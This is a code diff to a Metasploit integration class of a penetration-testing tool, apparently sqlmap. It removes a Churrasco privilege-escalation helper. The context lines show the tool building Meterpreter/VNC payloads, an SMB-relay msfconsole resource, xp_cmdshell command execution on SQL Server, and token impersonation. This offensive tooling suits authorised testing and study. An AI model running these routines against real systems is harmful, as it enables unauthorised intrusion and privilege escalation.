@@ -185,7 +185,7 @@ class Metasploit:
         elif kb.os == "Windows" and encode:
             return self.__skeletonSelection("payload encoding", self.__msfEncodersList)
 
-    def __selectPayload(self, askChurrasco=True):
+    def __selectPayload(self):
         if kb.os == "Windows" and conf.privEsc:
             infoMsg  = "forcing Metasploit payload to Meterpreter because "
             infoMsg += "it is the only payload that can be used to "
@@ -249,19 +249,7 @@ class Metasploit:
 
                             break
 
-                        elif not askChurrasco:
-                            logger.warn("beware that the VNC injection might not work")
-
-                            break
-
                         elif kb.dbms == "Microsoft SQL Server" and kb.dbmsVersion[0] in ( "2005", "2008" ):
-                            uploaded = self.uploadChurrasco()
-
-                            if not uploaded:
-                                warnMsg  = "beware that the VNC injection "
-                                warnMsg += "might not work"
-                                logger.warn(warnMsg)
-
                             break
 
                     elif not choice.isdigit():
@@ -312,12 +300,12 @@ class Metasploit:
     def __selectConnection(self):
         return self.__skeletonSelection("connection type", self.__msfConnectionsList)
 
-    def __prepareIngredients(self, encode=True, askChurrasco=True):
+    def __prepareIngredients(self, encode=True):
         self.connectionStr  = self.__selectConnection()
         self.lhostStr       = self.__selectLhost()
         self.rhostStr       = self.__selectRhost()
         self.portStr        = self.__selectPort()
-        self.payloadStr     = self.__selectPayload(askChurrasco)
+        self.payloadStr     = self.__selectPayload()
         self.encoderStr     = self.__selectEncoder(encode)
 
         if self.payloadStr == "linux/x86/shell":
@@ -350,7 +338,7 @@ class Metasploit:
     def __forgeMsfConsoleResource(self):
         self.resourceFile = os.path.join(conf.outputPath, self.__randFile)
 
-        self.__prepareIngredients(encode=False, askChurrasco=False)
+        self.__prepareIngredients(encode=False)
 
         self.__resource  = "use windows/smb/smb_relay\n"
         self.__resource += "set SRVHOST %s\n" % self.lhostStr
@@ -426,9 +414,6 @@ class Metasploit:
 
         cmd = "%s &" % self.exeFilePathRemote
 
-        if self.cmdFromChurrasco and kb.stackedTest:
-            cmd = "%s \"%s\"" % (self.churrascoPath, cmd)
-
         if kb.dbms == "Microsoft SQL Server" and kb.stackedTest:
             cmd = self.xpCmdshellForgeCmd(cmd)
 
@@ -462,7 +447,7 @@ class Metasploit:
             infoMsg  = "displaying the list of Access Tokens availables. "
             infoMsg += "Choose which user you want to impersonate by "
             infoMsg += "using incognito's command 'impersonate_token' if "
-            infoMsg += "'getsystem' did not success to elevate privileges"
+            infoMsg += "'getsystem' does not success to elevate privileges"
             logger.info(infoMsg)
 
             proc.stdin.write("list_tokens -u\n")
@@ -534,7 +519,7 @@ class Metasploit:
         self.__shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self.__randStr)
 
         self.__initVars()
-        self.__prepareIngredients(encode=encode, askChurrasco=False)
+        self.__prepareIngredients(encode=encode)
         self.__forgeMsfPayloadCmd(exitfunc, format, self.__shellcodeFilePath, extra)
 
         logger.debug("executing local command: %s" % self.__payloadCmd)
